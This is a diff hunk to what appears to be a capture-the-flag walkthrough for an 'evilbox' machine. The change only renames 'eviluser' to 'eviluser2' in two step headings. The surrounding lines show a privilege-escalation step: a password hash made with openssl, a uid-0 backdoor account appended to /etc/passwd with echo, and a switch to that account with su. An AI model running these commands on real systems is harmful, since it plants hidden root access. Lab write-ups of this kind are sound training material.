@@ -129,11 +129,11 @@
     * Make a password using openssl  
         - `openssl passwd -1 -salt usersalt`  
         - Password: pass  
-    * Add an eviluser in the /etc/passwd as a root  
+    * Add an eviluser2 in the /etc/passwd as a root  
         - `echo 'eviluser2:$1$usersalt$AdRPkkbvjFipmAjyOm.NT/:0:0:root:/root:/bin/bash' >> /etc/passwd`  
 
 1. Change the backdoor account  
-    * Change to the eviluser  
+    * Change to the eviluser2  
     ![Eviluser2](./img/evilbox-server16.png)  
         - `su eviluser2`
         - Password: pass  
